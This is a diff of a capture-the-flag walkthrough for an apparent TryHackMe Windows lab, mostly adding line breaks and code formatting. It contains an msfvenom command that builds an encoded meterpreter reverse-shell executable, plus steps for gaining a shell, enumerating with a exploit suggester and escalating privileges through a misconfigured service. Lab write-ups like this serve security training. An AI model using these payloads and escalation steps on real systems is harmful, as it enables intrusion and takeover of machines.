@@ -1234,6 +1234,7 @@ Exploit-Database is a CVE (common vulnerability and exposures) archive of public
 * A reverse shell should trigger on your attack machine.
 
 *Using the public exploit, gain initial access to the server. Who is the webserver running as?* II[REDACTED]og
+
 Use the `whoamI` command to get the username.
 
 
@@ -1254,6 +1255,7 @@ _Tip: You can generate the reverse-shell payload using msfvenom, upload it using
 You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.
 
 The process:
+
 * Create a Metasploit payload in `msfvenom`. 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
@@ -1302,11 +1304,13 @@ Meterpreter     : x86/windows
 Further enumerate the machine.
 
 *What is the name of the abnormal _service_ running?* Wi[REDACTED]er
+
 It took me a bit to land on the right service. Lots of searching. Once I got the service name, a look at the system logs showed it ran every 30 seconds as root. 
 
 *What is the name of the binary you're supposed to exploit?* M[REDACTED].exe
 
 *Using this abnormal service, escalate your privileges!*
+
 That worked as follows:
 * I transfered the same meterpreter payload to the proper directory.
 * Startetd another meterpreter listener.
@@ -1329,7 +1333,7 @@ Once we have established this we will use winPEAS to enumerate the system for po
 
 Answer the questions below
 
-Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp  
+Now we can generate a more stable shell using `msfvenom`, instead of using a `meterpreter`, This time let's set our payload to `windows/shell_reverse_tcp`  
 
 After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).  
 _Tip: It's common to find C:\Windows\Temp is world writable!_  
